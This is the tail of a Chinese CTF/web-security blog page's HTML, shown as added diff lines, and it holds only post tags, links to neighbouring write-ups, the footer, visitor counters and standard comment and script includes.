+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018-AH-National-Final/" rel="prev" title="2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2018 全国大学生软件测试大赛 安恒杯Web测试大赛 全国总决赛 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Daily-CTF-Group-Question-4/" rel="next" title="关于某CTF交流群的入群题">
+                  关于某CTF交流群的入群题 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
